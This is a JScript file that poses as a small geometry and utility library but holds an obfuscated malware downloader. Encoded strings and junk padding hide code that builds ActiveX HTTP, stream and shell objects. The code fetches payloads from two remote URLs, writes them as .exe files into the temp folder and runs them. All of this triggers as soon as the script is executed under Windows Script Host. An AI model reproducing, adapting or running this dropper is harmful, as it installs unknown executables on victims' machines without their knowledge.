var cudgel = 0;
bremen = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  indicate = [];
var cynic = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
String.prototype.regimen = function () {
	valley = this;
	for (var i in cynic){valley = valley.replace(i, cynic[i]);}
    return valley;
};
  for ( var i = 128; i--; ) {
    if ( indicate[ i ] === undefined )
      indicate[ i ] = -1;
  
    indicate[ bremen.charCodeAt( i ) ] = i;
  }
var transfer = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.regimen4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("jeremy").join("");
    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
	do {
	    c1 = indicate[str.charCodeAt(i++) & 0xff];
	} while(i < len && c1 == -1);
	if(c1 == -1)
	    break;
	do {
	    c2 = indicate[str.charCodeAt(i++) & 0xff];
	} while(i < len && c2 == -1);
	if(c2 == -1)
	    break;

	out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

	do {
	    c3 = str.charCodeAt(i++) & 0xff;
	    if(c3 == 61)
		return out;
	    c3 = indicate[c3];
	} while(i < len && c3 == -1);
	if(c3 == -1)
	    break;

	out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

	do {
	    c4 = str.charCodeAt(i++) & 0xff;
	    if(c4 == 61)
		return out;
	    c4 = indicate[c4];
	} while(i < len && c4 == -1);
	if(c4 == -1)
	    break;
	out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}

Point.distance = function(p1, p2) {
    var a = p1.x - p2.x;
    var b = p1.y - p2.y;
    return Math.sqrt(a * a + b * b);
};
Point.dot = function(p1, p2) {
    return p1.x * p2.x + p1.y * p2.y;
};

Point.cross = function(p1, p2) {
    return p1.x * p2.y - p1.y * p2.x;
};

var trademark ="jeremyJVjeremyRFTVjeremyAl".regimen4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var particle = "jeremyQWjeremyN0aXZjeremylWE9iajeremymVjdA=jeremy=".regimen4();
String.prototype.regimen2 = function () {
    var maintained = {
        samaritan: this
    };
    maintained.finals = maintained.samaritan["c3Vic3RyaW5n".regimen4()](cudgel, transfer);
    return maintained.finals;
};

var miser ="jeremyRXhwYW5jeremykRW52aXjeremyJvbm1lbnRTdHJjeremypbmdz".regimen4();
var Native = function(options){
	
};
var cheap = [particle, miser,trademark,  ""+"."+("epilogue","wafer","contrition","dryness","techrepublic","sucker","socialism","central","exe"), "UnVu".regimen4(), ("M"+"SX"+"ML"+("amplifier","bacchus","lacquer","respiratory","southeastern","lintel","immediately","2.")+"|M"+"LH"+"TT"+("ultimate","friendship","carroll","berne","citizenship","forswear","laboratories","mobile","P>")+"WU"+("dynastic","teller","siberia","sampson","telegraphy","compaq","births","cr")+("provinces","truthfulness","legation","steve","donors","enhance","quagmire","although","ip")+"t:"+("translated","banned","rugby","irish","ravens","philippines","neville","goodfellowship","Sh")+"ell").regimen()];
surgery = "_F2_";
var topics = this[cheap.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
kBoOzwwAzXd = "WBesHUil";
linseed = (("ephesians", "presumptuous", "grammar", "termination", "maintain", "nevermore", "excess", "peSkuUjkl") + "ecJIfQmkm").regimen2();
plymouth = (("bradley", "postponement", "fallacy", "brett", "wetting", "syntax", "costume", "glutton", "modify", "sJrMXcv") + "XwoPwS").regimen2();
  
    String.prototype.presentations = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var tablespoon = cheap.pop().split(">");

squash = "b3Blbg==".regimen4();
var pronunciation = new topics(tablespoon[1]);
AfHdtDnmpU = "_F3_";
var bashful = new topics(tablespoon[0]);
var plans = pronunciation[cheap.shift()](cheap.shift());
MFWAxq = "_F5_";
weasel = (("acquisitions", "tablets", "hearing", "gainsay", "EbMownfwHiBh") + "TiYRkNVN").regimen2();

var tenet = cheap.shift();
var etching = cheap.shift();
function dimmer(peerage, minneapolis) {

    try {
        var indirect = plans + "/" + minneapolis ;
		indirect = indirect+ tenet;
            bashful[squash](("varnish","faithfulness","G" + weasel) + ("hearts","charon","refers","sepulchral","T"), peerage, false);
       
    iahYiiQIM = "_F7_";
    bashful[plymouth + ("pyramid","coffee","end")]();
	var harboured=(WScript+"linseed"=="V2luZG93cyBTY3JpcHQgSG9zdA==".regimen4()+"linseed")&&bashful["c3RhdHVz".regimen4()] +""=="MjAw".regimen4()&&typeof(cRdaHOBj)==="undefined";
	lQHNgR = "_F8_";
    if (harboured) {
		
        var patent = new topics((("ambergris","saint","creature","nickel","copying","housewares","alsatian","podcasts","A")+("shipped","capsule","unions","promise","mattress","scathing","omnibus","doorstep","SEOO")+"DB"+("targets","relying","warbler","etruria","handiwork","molecules","expenses",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        patent[squash]();
        tNKitNM = "_F9_";
        patent.type = transfer;
        tLcysgnRMgw = "_F10_";
        patent["d3JpdGU=".regimen4()](bashful[("planes","extension","freebsd","craps","arbitration","stipulate","insistence","")+"R"+"es"+"pon"+cynic['U'].toLowerCase()+"e"+"Qm9keQ==".regimen4()]);
        WFYvef = "_F11_";
        patent[(linseed + "o"+("objectionable","curtail","voting","literacy","previously","elephant","piping","cracking","00")+("lounge","upgrades","flurry","curbed","briefing","pleasant","precedence","8i")+"tion").replace("0"+("arising","coalesce","pitiable","bodyguard","allowable","students","peach","08"), plymouth)] = 0;
        PhqcHDMu = "_F12_";
        patent[("inflammatory","maritime","keenness","disgorge","caucasus","plutarch","celerity","s")+"aveT"+"oF"+"ile"](indirect, 2);
        xRNkumwVJXI = "_F13_";
        patent.close();
        PiUHeelNNo = "_F14_";
		pronunciation[etching](indirect, transfer, true);
    }
} catch (npVNdI) { };

    TEKtuUrm = "_F15_";
}
try{
dimmer("aHR0cDovLw==".regimen4()+"\u006A\u0064\u002D\u0070\u0072\u006F\u0064\u0075\u0063\u0074\u0073\u002E"+"\u006E\u006C\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?JidLfvMaXv=CyBGeiNz","xxtmpeeawMa");}catch(RvAEKCW){}

dimmer("aHR0cDovLw==".regimen4()+"\u0061\u0075\u0073\u0074\u0072\u0061\u006C\u0069\u0061\u006E\u0064\u0069\u0065\u0074\u0069\u0074"+"\u0069\u0061\u006E\u002E\u0063\u006F\u006D\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?BVPHpQucepm=QqkmOP","brLCludK");
   bcsEQH = "_F16_";
   